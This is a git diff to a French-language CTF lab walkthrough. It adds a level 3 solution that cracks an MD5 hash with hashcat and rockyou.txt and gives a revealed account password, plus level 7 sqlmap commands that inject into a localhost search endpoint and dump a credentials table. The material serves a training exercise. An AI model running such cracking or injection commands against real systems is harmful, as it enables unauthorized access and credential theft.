@@ -26,7 +26,18 @@ ssh -i key_rsa lvl03@10.100.3.2
 
 ### Niveau 3: Détecter le / les cryptages utilisés et décoder des messages
 
-**WORK IN PROGRESS**
+
+- lister les fichiers et dossiers cachés avec `ls -la`
+- trouver le dossier caché `.vault` et accéder à son contenu
+- Le fichier `encrypted_message` contient un message chiffré, il faut détecter le type de chiffrement utilisé le déchiffrer
+- Etape 1 : Décoder le message qui en est encodé en base64
+- Etape 2 : reperer le param password dans la chaine obtenu, ainsi que le param algo
+- Etape 3 : Utiliser hashcat pour cracker le mot de passe en utilisant l'algo spécifié (md5) et le fichier dictionnaire rockyou.txt
+  - `hashcat -m 0 -a 0 <hash> rockyou.txt`
+
+Résultat : username: lvl04 / password: 4IqOygbPL5dcFYPT
+
+
 
 ### Niveau 4: Naviguer dans le labyrinthe et trouver la sortie
 
@@ -41,9 +52,30 @@ ssh -i key_rsa lvl03@10.100.3.2
 
 ### Niveau 5: Utiliser le social engineering pour obtenir des informations et cracker un mot de passe
 
+**WORK IN PROGRESS**
+
 ### Niveau 6: Trouver la bonne séquence
 
+**WORK IN PROGRESS**
+
 ### Niveau 7: Attaquer la base de données d'un site web
+
+Requeter le site web via curl afin de forger une commande sqlmap afin de s'injecter dans la base de données
+
+```bash
+sqlmap -u "http://localhost/api/search.php?id=1" --batch
+
+# 2. Lister les bases
+sqlmap -u "http://localhost/api/search.php?id=1" --dbs --batch
+# Output: deepdive_db
+
+# 3. Lister les tables
+sqlmap -u "http://localhost/api/search.php?id=1" -D deepdive_db --tables --batch
+# Output: users, credentials, system_access
+
+# 4. Dumper la table credentials
+sqlmap -u "http://localhost/api/search.php?id=1" -D deepdive_db -T credentials --dump --batch
+```
 
 ### Niveau 8: Fragment Hunt
 
@@ -69,4 +101,4 @@ Chaque machine contient:
 
 ### Niveau 9: The End
 
-## Fichier 
+Vous avez triomphé de tous les défis et vous êtes arrivé à la fin du labyrinthe. Félicitations !
